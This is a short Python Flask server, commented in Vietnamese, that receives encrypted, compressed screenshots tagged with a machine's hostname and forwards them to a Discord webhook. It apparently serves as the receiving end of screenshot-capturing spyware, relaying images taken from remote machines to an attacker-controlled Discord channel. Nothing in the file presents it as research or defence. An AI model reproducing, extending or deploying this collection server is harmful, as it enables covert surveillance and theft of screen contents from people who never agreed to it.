from flask import Flask, request, jsonify
import os
import zlib
import base64
import json
from datetime import datetime
import requests
from cryptography.fernet import Fernet
from dotenv import load_dotenv
import threading
import io
from PIL import Image

# Load biến môi trường (Discord webhook, secret key)
load_dotenv()

DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")
FERNET_KEY = os.getenv("FERNET_KEY")  # Khóa Fernet 32-byte base64

app = Flask(__name__)

fernet = Fernet(FERNET_KEY)
session = requests.Session()  # Tái sử dụng TCP connection

def decrypt_and_decompress(data_base64: str) -> bytes:
    encrypted_data = base64.b64decode(data_base64)
    decrypted = fernet.decrypt(encrypted_data)
    return zlib.decompress(decrypted)

def optimize_image(img_bytes: bytes) -> bytes:
    """Chuyển PNG sang JPEG nén và resize nếu quá lớn"""
    with Image.open(io.BytesIO(img_bytes)) as img:
        if img.mode in ("RGBA", "P"):
            img = img.convert("RGB")
        max_dim = 1280
        if max(img.size) > max_dim:
            img.thumbnail((max_dim, max_dim))
        buffer = io.BytesIO()
        img.save(buffer, format="JPEG", quality=60, optimize=True)
        return buffer.getvalue()

def send_to_discord_memory_async(filename, img_bytes):
    def task():
        files = {"file": (filename, io.BytesIO(img_bytes), "image/jpeg")}
        data = {"content": f"📷 Ảnh đã nén: `{filename}`"}
        try:
            res = session.post(DISCORD_WEBHOOK_URL, data=data, files=files, timeout=5)
            print(f"[Discord] Status: {res.status_code}")
        except Exception as e:
            print(f"[!] Lỗi gửi Discord: {e}")

    thread = threading.Thread(target=task, daemon=True)
    thread.start()

@app.route("/", methods=["GET"])
def home():
    return "Server hoạt động", 200

@app.route("/upload", methods=["POST"])
def upload():
    try:
        content = request.get_json()
        sys_info = content["system_info"]
        image_enc = content["screenshot"]

        img_data = decrypt_and_decompress(image_enc)
        img_optimized = optimize_image(img_data)

        filename = f"{sys_info['hostname']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"

        # Gửi file nén lên Discord bất đồng bộ
        send_to_discord_memory_async(filename, img_optimized)

        return jsonify({"status": "success", "filename": filename})
    except Exception as e:
        print(f"[!] Upload Error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 400

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
